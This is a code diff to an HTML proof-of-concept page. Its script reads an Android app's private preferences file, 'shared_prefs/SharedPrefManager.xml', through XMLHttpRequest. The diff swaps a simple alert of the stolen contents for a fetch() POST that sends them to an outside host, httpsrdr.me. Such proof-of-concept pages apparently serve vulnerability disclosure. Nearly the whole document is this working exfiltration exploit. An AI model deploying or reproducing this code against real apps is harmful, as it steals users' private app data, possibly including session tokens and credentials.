@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>page</title>
+    <title>Page</title>
   </head>
   <body>
-    <h1> Hjjja</h1>
+    <h1> PoC</h1>
     <script type="text/javascript">
       function theftFile(path, callback) {
         var oReq = new XMLHttpRequest();
@@ -24,7 +24,20 @@
       }
 
       theftFile('shared_prefs/SharedPrefManager.xml', function (contents) {
-        alert(contents);
+        fetch('https://www.httpsrdr.me/endpoint', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'text/plain'
+    },
+    body: contents
+  })
+  .then(response => response.text())
+  .then(result => {
+    console.log('POST success:', result);
+  })
+  .catch(error => {
+    console.error('POST error:', error);
+  });
       });
     </script>
   </body>
